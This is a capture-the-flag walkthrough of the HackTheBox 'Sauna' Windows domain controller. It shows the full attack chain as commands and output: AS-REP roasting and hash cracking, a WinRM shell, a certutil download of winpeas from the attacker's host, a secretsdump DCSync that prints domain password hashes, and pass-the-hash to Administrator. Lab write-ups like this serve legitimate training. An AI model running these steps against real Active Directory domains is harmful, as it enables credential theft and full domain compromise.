## 	  HackTheBox - Sauna		

​				

![](https://github.com/Strawhack/HackTheBox/blob/master/Sauna/Photos/1.png)

​					

HackTheBox also called as HTB in short, is a platform which host a large number of vulnerable machines. This gives opportunity for students, pen-tester, researchers and other enthusiast to carry out pen-testing to improve their skills. The aim of the vulnerable box is to exploit the various vulnerabilities present on the box and to obtain the User and Root flag.  

Today we are going to look at a box named Sauna which is created by [egotisticalSW](https://www.hackthebox.eu/profile/94858). The box is rated as easy on HTB platform and is hosted on Windows OS.



## Reconnaissance

The first step towards finding any vulnerability is to find which ports are __Open__. To find open ports, we use a tool named __Nmap__. 

An initial scan with conducted with Nmap  with the following switch:

| Nmap Switch | Description                                                  |
| ----------- | ------------------------------------------------------------ |
| -sV         | Probe open ports to determine service/version info.          |
| -sC         | equivalent to --script=default.                              |
| -A          | Enable OS detection, version detection, script scanning, and trace route. |
| -oN         | Output scan in Normal.                                       |

```bash
nmap -sC -sV -A -oN nmap_default.txt 10.10.10.175
Nmap scan report for 10.10.10.175

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-14 11:16:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```

From the above Nmap result, we find the domain name as EGOTISTICAL-BANK.LOCAL. Making an entry in /etc/hosts as shown 

```bash
127.0.0.1	 localhost
127.0.1.1	 linux
10.10.10.175 EGOTISTICAL-BANK.LOCAL
```

We see few interesting port open, especially Port 389, Port 445 and Port 80. Looking at Port 80, we find information about the team member. 



![Possible USers](https://github.com/Strawhack/HackTheBox/blob/master/Sauna/Photos/2.png)

![Possible User](https://github.com/Strawhack/HackTheBox/blob/master/Sauna/Photos/3.png)



Making a note of possible user from the above list and saving file as user.txt

```css
fsmith
scoints
hbear
btaylor
sdriver
skerb
```



```python
The ASREPRoast attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS_REQ request to the KDC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline. More detail in Kerberos theory.

Furthermore, no domain account is needed to perform this attack, only connection to the KDC. However, with a domain account, an LDAP query can be used to retrieve users without Kerberos pre-authentication in the domain. 

From Linux
The script GetNPUsers.py can be used from a Linux machine in order to harvest the non-preauth AS_REP responses.

Source: https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
```

With the above list along with GetNPUsers.py from Impacket, we can try to extract the Kerberos Key for user without Pre-Authentication is disabled.

```bash
 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -usersfile user.txt
 
 $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a4e4bfa2a1ae4373eb5906bca640a98d$3dc7e9f69cdb08c0ce51237b1a758f808a569dbcea420887b2a527b89e4030fcb1c729be1ce36c3731aa83c2ebecdf8d30b8051dd3815a74dbaa498256bf06e76a8984ac6b963c3cdf4a6b21d73c7060c2ab38e3cd200a8b5318cfeaa74de6a0c8b41220ab46fc873636784edf427c8e6e51538b3993fd6f3d0b207f74b8a27ef4113555efb5c4af9e869ca1e78741af0d012dc66b631c61ef2fd1e0ab8173deabbf429943590cb435524e77d0cad5ea39a188e6739beda88275a71e856f15fb7f75491c49f25dd7868213f9b8dece837dc3c886e2a0d40db9be0040b96696ca730810079e8728a2c7d8a5c3158fde07943e082955774aa7f08e8c62294c107d
```

To determine the above hash format, we look at hashcat hash example.

![](https://github.com/Strawhack/HackTheBox/blob/master/Sauna/Photos/4.png)

We crack the above hash using Hashcat.

```css
hashcat -m 18200 -a 0 hash /opt/wordlist/Seclist/Passwords/Leaked-Databases/rockyou.txt

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:55e3887ed39f01c400132f9f78ff412b$8ed72f1fee44b2e34873d729e23de65977b01339b5d45f2b8247661c67f8ac18d187031e2adab69b8039f4643cb644b91d2276c0253322cc56359798e45c7612aefffb0e6ac772edc686e5ae41b20bf69a977b13d681fba903eb4ff5f56d0d8f8f85170e4eceb414de7effd365ebe275df24742649c6c12d458afd60d7252b03865cf1ff15f9c811e2cdb5c9533603443374e8524e9fdca0f63e1ed5d053381a366be8f06f6557d620b36645f9f6761f6f407a4519af675f3ae7d79ba0fa5d22e74887ccccee209ae32bf03d9a44a234d21b8e59cc83f27cb1dfe3cacd3358b92c0dee55c3ca6a4c6cc883fa17bdac05b8d4090de0f1e5533e65b1310ed3fc8d:Thestrokes23

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
```



## User Flag

We obtain the password above hash

> fsmith:Thestrokes23

Having the credential for the user __fsmith__, we can get initial foothold using a tool named "Evil-WinRM".

```bash
Strawhack@linux:~$evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents>

```

We find our first flag User.txt on fsmith's desktop

```ruby
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir


    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/23/2020  10:03 AM             34 user.txt

*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
1b5520b98d----------------af70cf

```



## Privilege Escalation

Using net users, we determine the users on the target

```bash
*Evil-WinRM* PS C:\Users\FSmith\Downloads> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
```



Lets use a tool named WinPeas (Part of Privilege Escalation Awesome Scripts Suite). First we download WinPeas.exe on the target machine.

```bash
*Evil-WinRM* PS C:\Users\FSmith\Downloads> certutil.exe -urlcache -f http://10.10.14.18/winpeas64.exe winpeas.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Users\FSmith\Downloads> dir


    Directory: C:\Users\FSmith\Downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/28/2020   4:55 AM         241664 winpeas.exe
```

Executing the winpeas.exe and looking at output, we find credential for another user svc_loanmgr

```ruby
*Evil-WinRM* PS C:\Users\FSmith\Downloads> .\winpeas.exe

[+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```



Password for svc_loanmanager

> svc_loanmgr:Moneymakestheworldgoround!



Again, using the script provided by Impacket named secretdumps.py, we can hashes of all AD users from AD.

Advantage of using this is that you can do it remotely from either Linux or Windows. This tool uses a standard RPC call to collect information from target machine.

```python
secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:"Moneymakestheworldgoround!"@10.10.10.175
Impacket v0.9.22.dev1+20200713.100928.1e84ad60 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:a7689cc5799cdee8ace0c7c880b1efe3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
Administrator:des-cbc-md5:19d5f15d689b1ce5
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
----------
```

From the above, we find the NTLM hash for the user "Administrator".

>Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff
>
>Where:
>
>LM Hash: aad3b435b51404eeaad3b435b51404ee
>
>NT hash: d9485863c1e9e05851aa40cbb4ab9dff



Again we use the tool "Evil-WinRM" to gain access to target as administrator.

```bash
strawhack@linux:~$ evil-winrm -i 10.10.10.175 -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
egotisticalbank\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/23/2020  10:22 AM             32 root.txt

```

We obtain the root.txt. 

```css
*Evil-WinRM* PS C:\Users\Administrator\Desktop> Get-Content root.txt
f3ee04965----------------c5e881f
```





## Links

| How to Attack Kerberos   | https://www.tarlogic.com/en/blog/how-to-attack-kerberos/     |
| ------------------------ | ------------------------------------------------------------ |
| Impacket                 | https://github.com/SecureAuthCorp/impacket                   |
| Dumping AD Password Hash | https://medium.com/@airman604/dumping-active-directory-password-hashes-deb9468d1633 |

